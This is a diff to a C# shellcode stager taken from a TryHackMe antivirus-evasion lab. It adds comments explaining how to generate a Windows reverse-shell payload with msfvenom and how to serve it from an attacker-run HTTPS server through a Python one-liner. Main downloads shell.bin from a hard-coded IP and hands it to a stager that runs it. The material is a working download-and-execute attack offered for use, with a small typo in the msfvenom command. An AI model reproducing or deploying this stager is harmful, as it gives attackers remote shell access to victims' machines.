@@ -1,4 +1,14 @@
-//1
+// you can find original code at https://tryhackme.com/r/room/avevasionshellcode , at task 6, but the original code has many bugs
+//use this command to get shell code: msfvenom -p windows/x64/shell_reverse_tcp  LHOST=attacker_ipLPORT=4433 -f raw -o /https/server/directory
+
+
+//use this commands to start https server :    
+
+
+//cd /https/server/directory
+//openssl req -new -x509 -keyout localhost.pem -out localhost.pem -days 365 -nodes
+//python3 -c "import http.server, ssl;server_address=('0.0.0.0',443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,certfile='localhost.pem',ssl_version=ssl.PROTOCOL_TLSv1_2);httpd.serve_forever()"
+
 using System;
 using System.Net;
 using System.Text;
@@ -20,7 +30,10 @@ public class Program {
 
 
   public static void Main(){
-    string url = "http://10.11.98.53/shell.bin";
+    string url = "http://10.11.98.53/shell.bin";//replace url with your url (attacker url)
+    //url could be http or https(you must set python https server by:
+    //python3 -c "import http.server, ssl;server_address=('0.0.0.0',443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,certfile='localhost.pem',ssl_version=ssl.PROTOCOL_TLSv1_2);httpd.serve_forever()"
+)
     Stager(url);
   }
 
